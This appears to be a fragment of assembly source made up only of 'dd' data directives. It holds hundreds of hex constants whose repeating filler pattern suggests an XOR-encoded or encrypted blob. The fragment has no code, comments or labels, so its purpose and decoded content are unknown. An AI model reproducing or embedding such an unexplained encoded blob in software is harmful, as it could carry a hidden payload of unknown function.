		dd 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh
		dd 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh
		dd 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h
		dd 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh
		dd 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh
		dd 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h
		dd 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh
		dd 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh
		dd 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h
		dd 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh
		dd 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh
		dd 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h
		dd 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh
		dd 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh
		dd 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h
		dd 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh
		dd 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh
		dd 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h
		dd 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh
		dd 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh
		dd 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h
		dd 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh
		dd 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh
		dd 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h
		dd 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh
		dd 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh
		dd 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h
		dd 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh
		dd 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh
		dd 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h
		dd 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh
		dd 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh
		dd 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h
		dd 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh
		dd 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh
		dd 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h
		dd 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh
		dd 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h, 0FD00FFFDh
		dd 0EFFD01FBh, 31FCCD20h, 0CC37DECFh, 0DDEB31BBh, 32D4CF21h
		dd 0CF4DDDBFh, 0DD11320Ah, 33E1CFFDh, 0CE54DCDDh, 0DC7D338Eh
		dd 330ECE95h, 0C970DBCBh, 0DAFB347Fh, 35D3C824h, 0C85EDAB6h
		dd 0DA593568h, 3508C8E1h, 0CB01DA0Ch, 0D9DC36E8h, 36DECB27h
		dd 0CB47D9BCh, 0D98836B6h, 367ECB83h, 0CBD4D965h, 0D91B360Fh
		dd 3616CBF1h, 0CA55D8FAh, 0D89737B0h, 3743CA7Eh, 0CAEFD838h
		dd 0D79E38E7h, 383BC5C2h, 0C412D71Ch, 0D6C539DFh, 397EC485h
		dd 0C4A9D665h, 0D5BC392Fh, 3A19C7D9h, 0C60FD4FBh, 0D4C93BF9h
		dd 3CAAC12Eh, 0C165D3B1h, 0D3843C83h, 3C4CC186h, 0C1B6D357h
		dd 0D3253C22h, 3DE2C1ECh, 0C022D2E8h, 0D2CF3DC5h, 3DA1C040h
		dd 0C06AD2A1h, 0D2743D97h, 3D4FC094h, 0C0B7D251h, 0D2323D2Ch
		dd 3D04C0DFh, 0C322D1E0h, 0D1CE3EC7h, 3EBDC34Ah, 0C368D19Dh
		dd 0D17D3E82h, 3E63C386h, 0C3ADD15Ah, 0D1333E28h, 3FE6C3F3h
		dd 0C240D0E2h, 0D0A33FBAh, 3F00C2A9h, 0FD00CFFDh, 0EFFD0023h
		dd 30A9CD3Ch, 0CD78DF94h, 0DE96306Bh, 316CCC79h, 0CCACDE74h
		dd 0DE343157h, 311DCCCFh, 0CF80DDD2h, 0DCFD3263h, 33B9CE37h
		dd 0CE82DC9Dh, 0DC253350h, 3304CEE2h, 0C94FDBF5h, 0DB493463h
		dd 3423C9C6h, 0C81DDB2Fh, 0DAC435C7h, 357CC863h, 0CB13DA3Fh
		dd 0D9C836C0h, 366CCB4Ah, 0CBB6D966h, 0D81C37EFh, 38CBCAF6h
		dd 0C568D7D7h, 0D7793895h, 382EC5A0h, 0C420D708h, 0D67A39D9h
		dd 3AFAC4ADh, 0C73BD5E3h, 0D51E3A69h, 3BCFC7ECh, 0C68AD4AEh
		dd 0D43E3B4Ch, 3CC0C123h, 0C1C3D3C0h, 0D3033C0Fh, 3DC3C01Ah
		dd 0C0E7D24Ch, 0D1E43D1Ch, 3EADC335h, 0C362D1B6h, 0D17F3E97h
		dd 3E52C3A6h, 0C237D10Ah, 0D04C3FACh, 3F15C2E9h, 0FD00DFFDh
		dd 0EFFD002Fh, 30BBCD24h, 0CD76DF94h, 0DF58304Fh, 3006CDC3h
		dd 0CC44DEE2h, 0DE593180h
		dd 3118CCBFh, 0CF32DDF5h, 0DD45328Dh, 3384CFE0h, 0C914DC7Bh
		dd 0DACA34F3h, 35A3C83Fh, 0C874DAA9h, 0DA443543h, 353AC8C8h
		dd 0CB35DA1Fh, 0D85E36D4h, 3702CAD0h, 0C540D7C7h, 0D7A538A3h
		dd 389EC563h, 0C584D781h, 0D748387Ch, 394FC43Bh, 0C4B2D658h
		dd 0D63B3952h, 3901C4D7h, 0C707D607h, 0D5AA3AE1h, 3A1DC76Fh
		dd 0C619D4F5h, 0D4DB3BF0h, 3BABC62Dh, 0C688D49Eh, 0D3863B4Ah
		dd 3D08C0DBh, 0C300D20Ah, 0D1EC3EE7h, 3ED1C31Bh, 0C3D0D136h
		dd 0D1163E0Fh, 3FE4C3F4h, 0C22ED0DFh, 0D0BF3FD4h, 3F25C26Eh
		dd 0FD00AFFDh, 0EFFD004Bh, 30A8CD40h, 0CD91DF91h, 0DF14303Bh
		dd 3183CC01h, 0C8E7DDA3h, 0D99C36C3h, 3663CB74h, 0CBF8D95Eh
		dd 0D89937ACh, 38B5CA94h, 0C420D792h, 0D6D539CBh, 39DFC42Ch
		dd 0C438D6C9h, 0D6BD39D3h, 39A7C444h, 0C450D6B1h, 0D6A539BBh
		dd 3984C466h, 0C49BD66Eh, 0D622395Ch, 3AC2C4FDh, 0C758D5B3h
		dd 0D5763A99h, 3BE4C7B6h, 0C658D4DAh, 0D4683B9Eh, 3CEEC69Ch
		dd 0C11DD3F7h, 0D3CB3CC2h, 3C6EC159h, 0C1E3D35Ah, 0D2AA3DD6h
		dd 3D77C05Dh, 0C349D222h, 0D1473E4Bh, 3E38C3C1h, 0C234D0D0h
		dd 0D0413F9Dh, 0EFAD00h, 0FD00EF21h, 0DFD630E0h, 3085CD36h
		dd 0CD8BDF8Dh, 0DF0E3057h, 31E5CDFFh, 0CC7EDEECh, 0DE5B3172h
		dd 3154CCADh, 0CF11DE14h, 0DD793289h, 322FCF99h, 0CFE4DD3Ah
		dd 0DCD23210h, 3376CE62h, 0C90BDC49h, 0DB4E3463h, 3417C9ECh
		dd 0C810DAFBh, 0DACA35F1h, 3523C866h, 0CBA7D976h, 0D8DB3655h
		dd 37A7CA37h, 0C52BD7FFh, 0D75C38A9h, 39DCC41Bh, 0C4AED6A0h
		dd 0D6243950h, 3A84C4E0h, 0C7BAD58Ah, 0D4793BACh, 3B46C6A1h
		dd 0C6DDD436h, 0D40F3B05h, 3CC6C119h, 0C16AD3C8h, 0D2CB3C94h
		dd 3D9CC03Eh, 0C0D7D25Fh, 0D2033D05h, 3ED4C30Ch, 0C34BD1B9h
		dd 0D1853E9Fh, 3E67C382h, 0C3A6D173h, 0D1403E5Fh, 3E39C3C3h
		dd 0C224D0E6h, 0D0B93FC4h, 3FB8C251h, 0C294D08Fh, 0D0253F2Dh
		dd 3F1AC2E3h, 0FD008FFDh, 0EFFD003Fh, 30D6CD2Fh, 0CDE0DF24h
		dd 0DEF3301Dh, 31A5CC15h, 0CC68DEA1h, 0DE6E3163h, 3171CC99h
		dd 0CCC3DE5Bh, 0DE12310Ah, 322ACFA3h, 0CE83DD32h, 0DC52334Ah
		dd 346AC963h, 0C843DB72h, 0DA92358Ah, 36AACB23h, 0CA03D9B2h
		dd 0D8D237CAh, 38CBC507h, 0C585D782h, 0D7683861h, 39E5C5BEh
		dd 0C421D6E6h, 0D66A399Fh, 3AE9C49Ch, 0C721D5ECh, 0D5C93AC2h
		dd 3A73C791h, 0C7C5D547h, 0D5203A3Fh, 3A1CC7E4h, 0C630D4DAh
		dd 0D4B03BA9h, 3BB0C657h, 0C68CD49Ah, 0D4243B3Dh, 3B16C6ECh
		dd 0C141D3C9h, 0D39C3CBBh, 3C4EC191h, 0C1D1D34Ch, 0D30C3C0Eh
		dd 3D3DC063h, 0C0FED20Ah, 0D1CD3EF9h, 3ED2C338h, 0C3F7D1B6h
		dd 0D0E03E11h, 3F76C25Bh, 0FD00D007h, 0EFFD70EFh, 0EFFC88h
		dd 0CD29DFE6h, 0DF1530A3h, 301FCDECh, 0CDF8DF09h, 0DEBC31F5h
		dd 318FCC5Ah, 0CCA3DE81h, 0DE313156h, 3110CCD9h, 0CF1CDDFBh
		dd 0DDD532CDh, 32A9CF2Dh, 0CF7CDD9Ah, 0DD35322Dh, 320ECFCDh
		dd 0CE33DD00h, 0DCA933D4h, 3358CE73h, 0C907DC33h, 0DBC834E1h
		dd 35C9C965h, 0C841DAC7h, 0DAAE35A8h, 356AC879h, 0C8C5DA52h
		dd 0DA09350Dh, 36E6CB01h, 0CB24D9EEh, 0D9CA36DFh, 36A8CB40h
		dd 0CB88D9ABh, 0D94D3671h, 363ECBC1h, 0CA03D921h, 0D8D137FEh
		dd 3767CA7Eh, 0CAB5D854h, 0D8083730h, 38CCC512h, 0C53AD7C9h
		dd 0D7B338A9h, 3886C558h, 0C57CD788h, 0D771386Ah, 3851C59Bh
		dd 0C40BD720h, 0D6E039FDh, 39BFC42Eh, 0C4A2D6ABh, 0D6523947h
		dd 3936C4B9h, 0C70FD618h, 0D5BF3ACAh, 3A87C760h, 0C774D593h
		dd 0D5723A91h, 3A4DC79Bh, 0C7B2D556h, 0D5183A2Eh, 3BF7C7F7h
		dd 0C628D4DFh, 0D4B73BD3h, 3BB5C64Fh, 0C66ED495h, 0D4583B73h
		dd 3B58C6ACh, 0C6D1D43Bh, 0D41B3B35h, 3CE9C6FFh, 0C133D3F1h
		dd 0D3353C66h, 3C3AC1CFh, 0C1F1D326h, 0D2CC3C19h, 3D97C066h
		dd 0C08FD283h, 0D2663D7Ah, 3D47C0A1h, 0C0CBD24Fh, 0D20D3D05h
		dd 3EF6C0F6h, 0C34FD1D8h, 0D17F3E8Ah, 3E4DC39Ch, 0C3BBD155h
		dd 0D1293E2Ch, 3E08C3E0h, 0C3F7D10Dh, 0D0D53FE9h, 3FA9C232h
		dd 0C257D0ADh, 0D0773F87h, 3F79C290h, 0C2B8D050h, 0D0343F50h
		dd 3F1AC2E9h, 0FD006FFDh, 0EFFD014Bh, 30DACD1Fh, 0CD6CDFAFh
		dd 0DF7A3097h, 3043CD96h, 0CDBEDF49h, 0DF263020h, 3004CDE2h
		dd 0CC01DF0Fh, 0DEE731FBh, 31A9CC32h, 0CC58DEB0h, 0DE763186h
		dd 3174CC91h, 0CCC2DE46h, 0DE283127h, 311ACCE9h, 0CF35DDE2h
		dd 0DD8D32BDh, 3291CF78h, 0CF8EDD79h, 0DD563270h, 3254CFB2h
		dd 0CFD1DD3Fh, 0DD07321Ch, 33F0CE1Ah, 0CE3ADCD7h, 0DCAB33A5h
		dd 3383CE65h, 0CEB7DC8Eh, 0DC353351h, 330ACED9h, 0C925DBF2h
		dd 0DBAE34ADh, 3483C960h, 0C97EDB89h, 0DB663460h, 3444C9A2h
		dd 0C9C1DB4Fh, 0DB103409h, 35FDC80Dh, 0C823DAE0h, 0DACE35C6h
		dd 358CC85Ah, 0C874DA97h, 0DA683566h, 353AC8BFh, 0CB03DA0Fh
		dd 0D9E136FFh, 36C1CB24h, 0CB4BD9C2h, 0D9A636BDh, 369ECB62h
		dd 0CBA4D97Eh, 0D93C3654h, 3622CBC7h, 0CBDBD928h, 0D8EA37EBh
		dd 37DFCA24h, 0CA70D8A7h, 0D8543762h, 372DCAB9h, 0CAE7D82Ch
		dd 0D8043700h, 38F9C50Ah, 0C526D7E0h, 0D7BE38DCh, 3849C585h
		dd 0C5B5D752h, 0D7423855h, 3826C5C4h, 0C5DAD733h, 0D5BE3819h
		dd 3AA0C749h, 0C75ED5A8h, 0D5793A8Bh, 3A4CC791h, 0C7FAD521h
		dd 0D4C83BF8h, 3BA8C640h, 0C659D4AFh, 0D4643B6Ch, 3B53C6A8h
		dd 0C6E2D427h, 0D4133B07h, 3CE6C6F8h, 0C11CD3E8h, 0D3D13CCAh
		dd 3C9CC13Bh, 0C1D6D348h, 0D3193C34h, 3C17C1EEh, 0C003D303h
		dd 0D2D63DE0h, 3E4DC39Ch, 0C3AED155h, 0D1403E58h, 3E05C3DDh
		dd 0C22CD10Eh, 0D09A3FA5h, 3F7FC285h, 0C2A2D06Ah, 0D02E3F46h
		dd 3F17C2E9h, 0FD007FFDh, 0EFFD01BFh, 30C5CD0Ch, 0CD38DFCFh
		dd 0DFB530D1h, 308ACD59h, 0CD75DF91h, 0DF763093h, 31EBCDC3h
		dd 0CC2ADED8h, 0DEC431DCh, 31A5CC3Eh, 0CF56DE9Bh, 0DD9F32B3h
		dd 329ECF6Bh, 0CFA3DD6Bh, 0DD073233h, 33DACE17h, 0CE47DCBDh
		dd 0DCA433BDh, 3376CE83h, 0CEBCDC55h, 0DC1F3335h, 3301CEE8h
		dd 0C909DC05h, 0DBE134FAh, 34C3C925h, 0C973DBC6h, 0DB27345Ah
		dd 340AC9E0h, 0C80DDB0Ch, 0DA3A352Eh, 353CC8CDh, 0C8E2DA21h
		dd 0D9ED36ECh, 36B3CB23h, 0CB97D987h, 0D93D365Ah, 363DCBC7h
		dd 0CA03D924h, 0D8D537F6h, 37B5CA3Ch, 0CA68D89Fh, 0D8853781h
		dd 377ACA89h, 0CAA5D861h, 0D8463743h, 38D1CAF3h, 0C573D79Eh
		dd 0D7483868h, 383BC5C1h, 0C5DED724h, 0D715380Ch, 39FEC5EDh
		dd 0C7B1D555h, 0D52E3A58h, 3A30C7DAh, 0C604D51Bh, 0D4B13BFCh
		dd 3B68C66Ah, 0C6B1D458h, 0D4383B50h, 3B3AC6CBh, 0C106D421h
		dd 0D3D63CF3h, 3CB2C13Fh, 0C16BD398h, 0D3863C9Eh, 3C77C18Ch
		dd 0C1A8D362h, 0D3433C40h, 3DE3C004h, 0C044D2C8h, 0D2283D29h
		dd 3ECEC0ECh, 0C387D183h, 0D15D3E61h, 3E06C3BFh, 0C219D0F3h
		dd 0D0A73FDFh, 3F83C261h, 0C296D087h, 0D02C3F25h, 0EFC2E0h
		dd 0FD004FFDh, 0EFFD000Bh, 30CDCD08h, 0CD56DFC1h, 0DF7F309Fh
		dd 3021CDA0h, 0CDF6DF11h, 0DEF83012h, 319CCC2Dh, 0CCCDDE5Ch
		dd 0DCF53114h, 33AFCE3Bh, 0CE57DCAFh, 0DC49339Ch, 3663CECDh
		dd 0CBC0D941h, 0D935362Bh, 363FCBCCh, 0CBD8D929h, 0D91D3633h
		dd 3607CBE4h, 0CBF0D911h, 0D905361Bh, 37EFCBFCh, 0CA08D8F9h
		dd 0D8ED37E3h, 3771CA14h, 0CAC3D84Ah, 0D82D3725h, 371CCAE1h
		dd 0C520D7ECh, 0D7A638D1h, 3890C578h, 0C594D771h, 0D72E384Ch
		dd 398AC422h, 0C4E4D668h
		dd 0D5DC3903h, 3A6AC750h, 0C7B0D569h, 0D4C03A0Eh, 3B9BC645h
		dd 0C6CED45Dh, 0D3FD3B05h, 3CD3C135h, 0C1ADD39Bh, 0D31E3C37h
		dd 3DE5C1F6h, 0C036D2E8h, 0D2633DD4h, 3D1FC0DCh, 0C35BD1E5h
		dd 0D1893E81h, 3FF1C392h, 0C238D0D3h, 0D0533F8Eh, 3F20C2C2h
		dd 0FD005FFDh, 0EFFD01E3h, 3095CD10h, 0CDA2DF6Bh, 0DF41305Fh
		dd 3006CDDDh, 0CC08DF01h, 0DEDF31F9h, 31BACC3Fh, 0CC80DE81h
		dd 0DE75316Bh, 317FCC8Ch, 0CC98DE69h, 0DE5D3173h, 3147CCA4h
		dd 0CCB0DE51h, 0DE45315Bh, 312FCCBCh, 0CCDBDE2Bh, 0DDD432E5h
		dd 3290CF49h, 0CFCADD51h, 0DD073233h, 33AECE0Ch, 0CE54DCADh
		dd 0DCA133B7h, 3378CE63h, 0C951DBCFh, 0DB443463h, 3414C9F3h
		dd 0C82FDADEh, 0DA5F356Ch, 3526C8A8h, 0C8FEDA22h, 0D9B436EAh
		dd 3680CB65h, 0CA86D8BAh, 0D6F23755h, 39F7C414h, 0C420D6E1h
		dd 0D6D539CBh, 39DFC42Ch, 0C438D6C9h, 0D6BD39D3h, 39A7C444h
		dd 0C4BBD68Ah, 0D5023A59h, 3BD0C637h, 0C69ED493h, 0D4303B49h
		dd 3C65C15Dh, 0C199D36Fh, 0D31F3C37h, 3DEFC1F6h, 0C0D8D2A7h
		dd 0D21D3D33h, 3D07C0E4h, 0C0F0D211h, 0D1ED3EEBh, 3EC1C320h
		dd 0C354D1B6h, 0D19F3EB4h, 3E67C37Ch, 0C3A7D165h, 0D11C3E5Eh
		dd 3FF0C3E7h, 0C298D08Eh, 0EFFDC0EFh, 0EFFDBCh,	0CD50DFC8h
		dd 0DF9A308Fh, 307ECD84h, 0CDBBDF58h, 0DEA23008h, 313FCC95h
		dd 0CF14DDEDh, 0DD7C328Ch, 324CCF9Ah, 0CE07DD39h, 0DC8133FBh
		dd 3329CE9Dh, 0C999DBAEh, 0DB3A344Ah, 35C9C9E2h, 0CB0BDAAFh
		dd 0D9483647h, 363ECBC8h, 0CAA1D925h, 0D7E238FFh, 38B3C53Ch
		dd 0C5B9D779h, 0D6DF39F3h, 3995C42Fh, 0C761D67Fh, 0D5913A89h
		dd 3A97C773h, 0C608D57Eh, 0D4C63BC0h, 3B9DC666h, 0C6EAD44Eh
		dd 0D3C63B00h, 3C7DC148h, 0C007D35Ah, 0D2E63DFDh, 3DA9C02Bh
		dd 0C089D2A6h, 0D1DC3D11h, 3E9AC34Fh, 0C3A6D173h, 0D1163E29h
		dd 3FF5C20Eh, 0C243D0D7h, 0D04F3F9Ch, 0EFC2DBh,	0FD003FFDh
		dd 0EFFD0013h, 30F7CD14h, 0CD20DFE1h, 0DFAF30ADh, 306DCD72h
		dd 0CDDDDF6Eh, 0DEC73015h, 317FCC7Eh, 0CCF5DE34h, 0DDFA32EFh
		dd 32C5CF1Ah, 0CFC7DD78h, 0DCBA3218h, 339ACE67h, 0CEE4DC56h
		dd 0DBED34E6h, 34BDC921h, 0C989DBA4h, 0DB5A344Eh, 343CC9B8h
		dd 0C9EFDB15h, 0DAC535DEh, 35B4C842h, 0C87FDA8Dh, 0DA22357Dh
		dd 36E9C8E5h, 0CB63D9C7h, 0D9213655h, 37A9CA26h, 0CA60D8B3h
		dd 0D8403784h, 3704CAE6h, 0C547D7F7h, 0D77C388Eh, 39C7C408h
		dd 0C469D6CBh, 0D606391Bh, 3ADCC70Eh, 0C77AD592h, 0D5473A64h
		dd 3A0DC7C1h, 0C60AD50Bh, 0D4C03BDAh, 3B9CC659h, 0C67FD487h
		dd 0D42B3B49h, 3CF9C6E8h, 0C151D3BFh, 0D34A3C75h, 3C12C1C1h
		dd 0C022D2FEh, 0D2B83DAFh, 3D8DC04Dh, 0C0ADD259h, 0D2453D5Ch
		dd 3EBFC314h, 0C388D19Eh, 0D1353E73h, 3FD6C3E1h, 0C25FD0ADh
		dd 0D0673F7Eh, 3F35C2BEh, 0FD000FFDh, 0EFFD0097h, 319CCC60h
		dd 0CCAFDE5Eh, 0DDDC32F5h, 32D8CF2Dh, 0CF7EDD9Eh, 0DD593262h
		dd 3243CFA8h, 0C933DD4Dh, 0DB9734A4h, 3473C992h, 0C9AFDB55h
		dd 0DB0A3400h, 35DCC80Bh, 0CA78D9C1h, 0D805371Dh, 38EBCAFEh
		dd 0C510D7F7h, 0D7E138F9h, 38C7C522h, 0C534D7D3h, 0D7BD38D5h
		dd 38A3C546h, 0C586D7AFh, 0D50839D5h, 3BD6C62Ah, 0C036D3B0h
		dd 0D24F3D4Dh, 3EFBC0FFh, 0FD001FFDh, 0EFFD00C7h, 3303CF77h
		dd 0C9C2DBADh, 0D97F36A6h, 3606CBD9h, 0C49FD66Fh, 0D5F0392Ch
		dd 3C52C756h, 0C2A1D12Ch, 0EFFC00EFh, 0EFFD68h,	0CCAADEBCh
		dd 0DC95338Bh, 339FCE6Ch, 0CE78DC89h, 0DC7D3393h, 3367CE84h
		dd 0CE90DC71h, 0DC65337Bh, 334FCE9Ch, 0CEA8DC59h, 0DC4D3343h
		dd 3357CEB4h, 0CEC0DC41h, 0DC35332Bh, 333FCECCh, 0CED8DC29h
		dd 0DC1D3333h, 3307CEE4h, 0CEF7DC11h, 0DA2634EAh, 36CFCB11h
		dd 0C5F7D82Ch, 0D0CA3FE0h, 0EFC2A2h, 0FD01FFFDh, 0EFFD00CFh
		dd 33A7CC79h, 0CE66DCAAh, 0D7D0339Ah, 388CC54Fh, 0C058D2CBh
		dd 0EFFD3D83h, 0EEDD00h, 0FD00EFDDh, 0DEB731D3h, 34D8C91Ch
		dd 0C563D7ADh, 0D58A3892h, 3A65C77Fh, 0FD00D55Dh, 0EFFC30EFh
		dd 0EFFD68h, 0CDA1DF92h, 0DF433045h, 3009CDCAh,	0CC04DF12h
		dd 0DED131FFh, 31A9CC35h, 0CC6BDEAFh, 0DE7B319Bh, 3144CC92h
		dd 0CCC5DE4Fh, 0DE11313Fh, 32E5CCF5h, 0CF32DDEBh, 0DDB232D4h
		dd 329BCF5Bh, 0CF8FDD80h, 0DD3A3277h, 320BCFD0h, 0CE10DD10h
		dd 0DC8D338Fh, 35BECE7Ah, 0CB7BDAA2h, 0D7033666h, 3FA9C403h
		dd 0FD01AFFDh, 0EFFD00ABh, 3280CF05h, 0C4E3D6D7h, 0D57F391Dh
		dd 3BD2C791h, 0C3F1D4B1h, 0D0F83E11h, 3FDDC20Ah, 0C272D0C5h
		dd 0D0833F97h, 3F41C2A0h, 0C2BCD04Bh, 0D0293F28h, 3F05C2DCh
		dd 0C2F4D012h, 0EFFD3F16h, 0EEAD00h, 0FD00EF51h, 0DFEC30EBh
		dd 30DFCD1Bh, 0CD42DFC1h, 0DF8B308Bh, 3001CDD2h, 0CDFADF09h
		dd 0DEF531EDh, 31FBCC0Eh, 0CC20DEE7h, 0DED131C9h, 31D7CC32h
		dd 0CC44DEC3h, 0DEAD31A5h, 31B3CC56h, 0CC68DE9Fh, 0DE893181h
		dd 314DCC7Ah, 0CCD9DE44h, 0DDC63113h, 327ECF7Dh, 0CFD4DD49h
		dd 0DD17320Ah, 33E2CE08h, 0CE57DCCFh, 0DC6A3398h, 3338CEB7h
		dd 0C917DC0Ah, 0DB643497h, 35AEC821h, 0C8F1DA34h, 0D97C36B6h
		dd 37EECBD9h, 0CAD1D84Bh, 0D804370Eh, 38D0C511h, 0C592D799h
		dd 0D74C384Eh, 3800C5CFh, 0C429D6F1h, 0D69C39A6h, 3973C479h
		dd 0FD018FFDh, 0EFFD009Fh, 3433C9D8h, 0C9E4DB1Dh, 0DAF5341Fh
		dd 35FFC80Ch, 0C81CDAE9h, 0DAD935CFh, 35C3C828h, 0C834DACDh
		dd 0DAB535D7h, 35B3C858h, 0C864DA9Dh, 0DA913587h, 359BC870h
		dd 0C888DA85h, 0DA6D3563h, 3577C894h, 0C3A4D165h, 0D1413E5Fh
		dd 3E3BC3C8h, 0C3ECD11Dh, 0D0F93E17h, 3FFBC210h, 0C21CD0E5h
		dd 0D0D93FCFh, 3FC3C228h, 0C234D0CDh, 0EFFC90EFh, 0EFFDC4h
		dd 0C79CD565h, 0D5453A4Fh, 3A33C7CCh, 0C7F0D51Dh, 0D4E93BE3h
		dd 3BC7C61Ch, 0C650D4B9h, 0D4853B83h, 3B4FC694h, 0C6C4D441h
		dd 0D4253B23h, 3B13C6F4h, 0C10CD3F9h, 0D3C93CFBh, 3CB7C154h
		dd 0C178D391h, 0D34D3C6Fh, 3C3FC1C4h, 0C1F4D311h, 0D2E13DEFh
		dd 3DDFC024h, 0C058D2B1h, 0D27D3D9Bh, 3D47C09Ch, 0C0CCD239h
		dd 0D2093D37h, 3EE7C0FCh, 0C32CD1D9h, 0D1A93ED7h, 3E87C35Ch
		dd 0C38CD179h, 0D1493E77h, 3E27C3BCh, 0C3ECD119h, 0D0E93E17h
		dd 3FCBC21Ch, 0C234D0D1h, 0D0B93FD3h, 3FBBC24Ch, 0C27CD09Dh
		dd 0D0593F67h, 3F5BC2ACh, 0C2C4D041h, 0D0293F23h, 3F0BC2DCh
		dd 0C2F4D011h, 0EFFD3F13h, 0EE5D00h, 0FD00EF05h, 0DFF130EBh
		dd 30DBCD18h, 0CD48DFC1h, 0DF91308Bh, 3093CD74h, 0CD8CDF79h
		dd 0DF61307Bh, 3043CDA4h, 0CDBCDF49h, 0DF31302Bh, 300FCDD4h
		dd 0CC04DF01h, 0DED131FFh, 31D3CC34h, 0CC4CDEB9h, 0DEA131BBh
		dd 3183CC64h, 0CC7CDE89h, 0DE593167h, 3157CCACh, 0CCDCDE29h
		dd 0DE11310Bh, 3113CCF4h, 0CF0CDDF9h, 0DDDD32FBh, 32ABCF3Ch
		dd 0CF6CDDADh, 0DD81329Bh, 3263CF84h, 0CF9CDD69h, 0DD51324Bh
		dd 3253CFB4h, 0CFCCDD39h, 0DD21323Bh, 33EBCFE8h, 0CE18DCF1h
		dd 0DC9D33CFh, 336BCE74h, 0CEA0DC69h, 0DC353353h, 34EFCED0h
		dd 0C920DBE9h, 0DBB934D3h, 34B7C94Ch, 0C97CDB89h, 0DB593467h
		dd 345BC9ACh, 0C9C8DB3Dh, 0DAF13417h, 35CFC818h, 0C864DAADh
		dd 0DA71359Fh, 355BC898h, 0C8DCDA3Dh, 0D9F93507h, 36C3CB10h
		dd 0CB40D9C5h, 0D979369Fh, 3643CB90h, 0CBD4D945h, 0EFFCD0EFh
		dd 0EFFCACh, 0CD08DFF9h, 0DFED30E3h, 312FCD14h,	0CE5CDE2Dh
		dd 0DC99338Fh, 3383CE68h
		dd 0CE74DC8Dh, 0DC813397h, 336BCE80h, 0CE8CDC75h, 0DC69337Fh
		dd 3373CE98h, 0CEA4DC5Dh, 0DC513347h, 335BCEB0h, 0CEBCDC45h
		dd 0DC39332Fh, 3323CEC8h, 0CED4DC2Dh, 0DC213337h, 330BCEE0h
		dd 0CEECDC15h, 0DC09331Fh, 3313CEF8h, 0C904DBFDh, 0DBF134E7h
		dd 34FBC910h, 0C91CDBE5h, 0DBD934CFh, 34C3C928h, 0C934DBCDh
		dd 0DBC134D7h, 34ABC940h, 0C94CDBB5h, 0DBA934BFh, 34B3C958h
		dd 0C964DB9Dh, 0DB913487h, 349BC970h, 0C97CDB85h, 0DB79346Fh
		dd 3463C988h, 0C994DB6Dh, 0DB613477h, 344BC9A0h, 0C9ACDB55h
		dd 0DB49345Fh, 3453C9B8h, 0C9C4DB3Dh, 0DB313427h, 343BC9D0h
		dd 0C9DCDB25h, 0DB19340Fh, 3403C9E8h, 0C9F4DB0Dh, 0DB013417h
		dd 35EBC800h, 0C80CDAF5h, 0DAE935FFh, 35F3C818h, 0C824DADDh
		dd 0DAD135C7h, 35DBC830h, 0C83CDAC5h, 0DAB935AFh, 35A3C848h
		dd 0C854DAADh, 0DAA135B7h, 358BC860h, 0C86CDA95h, 0DA89359Fh
		dd 3593C878h, 0C884DA7Dh, 0DA713567h, 357BC890h, 0C89CDA65h
